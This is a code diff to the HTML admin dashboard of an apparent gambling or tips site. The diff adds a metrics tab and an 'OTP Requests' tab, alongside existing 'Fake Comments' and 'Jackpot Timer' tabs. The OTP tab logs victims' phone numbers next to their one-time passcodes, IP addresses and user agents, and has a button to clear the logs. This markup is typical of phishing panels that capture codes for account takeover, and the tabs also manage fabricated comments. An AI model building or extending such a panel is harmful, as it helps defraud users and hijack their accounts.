@@ -11,6 +11,7 @@
     <link rel="shortcut icon" href="/luckytaj-favicon/favicon.ico" />
     <link rel="apple-touch-icon" sizes="180x180" href="/luckytaj-favicon/apple-touch-icon.png" />
     <link rel="manifest" href="/luckytaj-favicon/site.webmanifest" />
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
 </head>
 <body>
     <div id="app">
@@ -58,8 +59,8 @@
             <div class="dashboard-main">
                 <!-- Navigation Tabs -->
                 <nav class="tab-navigation">
-                    <button class="tab-btn active" data-tab="banners">
-                        <i class="fas fa-images"></i> Banners
+                    <button class="tab-btn active" data-tab="metrics">
+                        <i class="fas fa-chart-bar"></i> User Interaction Metrics
                     </button>
                     <button class="tab-btn" data-tab="comments">
                         <i class="fas fa-comments"></i> Fake Comments
@@ -76,20 +77,111 @@
                     <button class="tab-btn" data-tab="jackpot">
                         <i class="fas fa-coins"></i> Jackpot Timer
                     </button>
+                    <button class="tab-btn" data-tab="otp-requests">
+                        <i class="fas fa-mobile-alt"></i> OTP Requests
+                    </button>
                 </nav>
 
                 <!-- Content Sections -->
                 <main class="dashboard-content">
-                <!-- Banners Section -->
-                <section id="banners" class="content-section active">
+                <!-- User Interaction Metrics Section -->
+                <section id="metrics" class="content-section active">
                     <div class="section-header">
-                        <h2><i class="fas fa-images"></i> Banner Management</h2>
-                        <button class="btn btn-primary" onclick="openBannerModal()">
-                            Add Banner
+                        <h2><i class="fas fa-chart-bar"></i> User Interaction Metrics</h2>
+                        <button class="btn btn-primary" onclick="refreshMetrics()">
+                            <i class="fas fa-sync-alt"></i> Refresh Data
                         </button>
                     </div>
-                    <div id="bannersGrid" class="banners-grid">
-                        <!-- Banners will be loaded here -->
+                    <div class="metrics-dashboard">
+                        <!-- Overview Cards -->
+                        <div class="metrics-overview">
+                            <div class="metric-card">
+                                <div class="metric-icon"><i class="fas fa-eye"></i></div>
+                                <div class="metric-content">
+                                    <h3>Total Views</h3>
+                                    <div class="metric-value" id="totalViews">-</div>
+                                    <div class="metric-change" id="totalViewsChange">+0% from last 24h</div>
+                                </div>
+                                <div class="metric-chart">
+                                    <canvas id="viewsChart" width="80" height="40"></canvas>
+                                </div>
+                            </div>
+                            <div class="metric-card">
+                                <div class="metric-icon"><i class="fas fa-users"></i></div>
+                                <div class="metric-content">
+                                    <h3>Unique Visitors</h3>
+                                    <div class="metric-value" id="uniqueVisitors">-</div>
+                                    <div class="metric-change" id="uniqueVisitorsChange">+0% from last 24h</div>
+                                </div>
+                                <div class="metric-chart">
+                                    <canvas id="visitorsChart" width="80" height="40"></canvas>
+                                </div>
+                            </div>
+                            <div class="metric-card">
+                                <div class="metric-icon"><i class="fas fa-mouse-pointer"></i></div>
+                                <div class="metric-content">
+                                    <h3>Click-Through Rate</h3>
+                                    <div class="metric-value" id="clickThroughRate">0%</div>
+                                    <div class="metric-change" id="clickThroughRateChange">+0% from yesterday</div>
+                                </div>
+                                <div class="metric-chart">
+                                    <canvas id="ctrChart" width="80" height="40"></canvas>
+                                </div>
+                            </div>
+                            <div class="metric-card">
+                                <div class="metric-icon"><i class="fas fa-clock"></i></div>
+                                <div class="metric-content">
+                                    <h3>Avg. Time on Page</h3>
+                                    <div class="metric-value" id="avgTimeOnPage">0s</div>
+                                    <div class="metric-change" id="avgTimeOnPageChange">+0% from yesterday</div>
+                                </div>
+                                <div class="metric-chart">
+                                    <canvas id="timeChart" width="80" height="40"></canvas>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- Device Type Chart -->
+                        <div class="metrics-section">
+                            <h3>Device Type Distribution</h3>
+                            <div class="device-metrics">
+                                <div class="device-chart">
+                                    <div class="device-stat">
+                                        <span class="device-label"><i class="fas fa-mobile-alt"></i> Mobile</span>
+                                        <div class="device-bar">
+                                            <div class="device-fill mobile" style="width: 0%"></div>
+                                        </div>
+                                        <span class="device-percentage" id="mobilePercentage">0%</span>
+                                    </div>
+                                    <div class="device-stat">
+                                        <span class="device-label"><i class="fas fa-desktop"></i> Desktop</span>
+                                        <div class="device-bar">
+                                            <div class="device-fill desktop" style="width: 0%"></div>
+                                        </div>
+                                        <span class="device-percentage" id="desktopPercentage">0%</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- Per Tip Performance -->
+                        <div class="metrics-section">
+                            <h3>Tip Performance</h3>
+                            <div class="tips-performance">
+                                <div id="tipsTable" class="tips-table">
+                                    <div class="table-header">
+                                        <div class="col-tip">Tip ID</div>
+                                        <div class="col-views">Views</div>
+                                        <div class="col-unique">Unique</div>
+                                        <div class="col-ctr">CTR</div>
+                                        <div class="col-time">Avg. Time</div>
+                                    </div>
+                                    <div id="tipsTableBody">
+                                        <div class="no-data">No tip data available</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
                     </div>
                 </section>
 
@@ -178,6 +270,86 @@
                             <div id="jackpotMessagesTable" class="messages-table">
                                 <!-- Messages will be loaded here -->
                             </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- OTP Requests Section -->
+                <section id="otp-requests" class="content-section">
+                    <div class="section-header">
+                        <h2><i class="fas fa-mobile-alt"></i> OTP Verification Logs</h2>
+                        <div class="otp-actions">
+                            <button class="btn btn-info" onclick="refreshOTPLogs()">
+                                <i class="fas fa-sync-alt"></i> Refresh
+                            </button>
+                            <button class="btn btn-warning" onclick="clearOTPLogs()">
+                                <i class="fas fa-trash"></i> Clear Logs
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <!-- OTP Statistics -->
+                    <div class="otp-stats" id="otpStats">
+                        <div class="stat-card">
+                            <div class="stat-icon">
+                                <i class="fas fa-phone"></i>
+                            </div>
+                            <div class="stat-content">
+                                <h3 id="totalRequests">-</h3>
+                                <p>Total Requests</p>
+                            </div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-icon">
+                                <i class="fas fa-calendar-day"></i>
+                            </div>
+                            <div class="stat-content">
+                                <h3 id="todayRequests">-</h3>
+                                <p>Today's Requests</p>
+                            </div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-icon">
+                                <i class="fas fa-users"></i>
+                            </div>
+                            <div class="stat-content">
+                                <h3 id="uniquePhones">-</h3>
+                                <p>Unique Numbers</p>
+                            </div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-icon">
+                                <i class="fas fa-clock"></i>
+                            </div>
+                            <div class="stat-content">
+                                <h3 id="lastRequestTime">-</h3>
+                                <p>Last Request</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- OTP Logs Table -->
+                    <div class="otp-logs-container">
+                        <div class="table-container">
+                            <table class="otp-table" id="otpTable">
+                                <thead>
+                                    <tr>
+                                        <th>Timestamp</th>
+                                        <th>Phone Number</th>
+                                        <th>OTP Code</th>
+                                        <th>IP Address</th>
+                                        <th>User Agent</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="otpTableBody">
+                                    <tr>
+                                        <td colspan="5" class="loading-message">Loading OTP logs...</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                        <div class="pagination" id="otpPagination">
+                            <!-- Pagination controls will be added here -->
                         </div>
                     </div>
                 </section>
